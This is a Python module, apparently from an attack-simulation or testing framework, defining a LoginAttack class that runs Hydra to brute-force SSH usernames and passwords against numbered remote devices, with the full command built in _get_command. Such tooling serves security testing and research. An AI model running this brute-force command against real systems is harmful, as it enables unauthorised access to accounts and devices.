import os
import signal
from subprocess import Popen, DEVNULL

from attacks.scripts.base_attack import BaseAttack
from defs.remote import Remote
from defs.utils import log
from defs.config import Config as Cfg


class LoginAttack(BaseAttack):
	"""
	Attack that tries to guess the username and password of the remote device through brute force.
	"""

	# Subprocess created to run the attack tool
	subprocess: Popen

	def get_attack_name(self) -> str:
		return "Login"

	def is_synchronous(self) -> bool:
		return False

	def start(self, device_num: int) -> bool:
		input_sequence = self._get_command(device_num).split(" ")
		self.subprocess = Popen(input_sequence, stdout=DEVNULL, stderr=DEVNULL)
		return True

	def end(self):
		self.subprocess.send_signal(signal.SIGINT)
		log("Waiting for login attack script to finish...")
		self.subprocess.wait()
		# Remove unnecessary file created by the program
		try:
			os.remove("hydra.restore")
		except FileNotFoundError:
			pass

	def _get_command(self, device_num: int) -> str:
		"""
		Returns The command string that should be run to launch the attack executable on a given device
		device_id: Number of the device the attack will be launched against
		"""
		return "hydra -I -t " + str(Cfg.get().login_num_threads) + " -l " + Remote.get_username(device_num) + \
			" -x 1:6:a1*_+- ssh://" + Remote.get_ip(device_num)
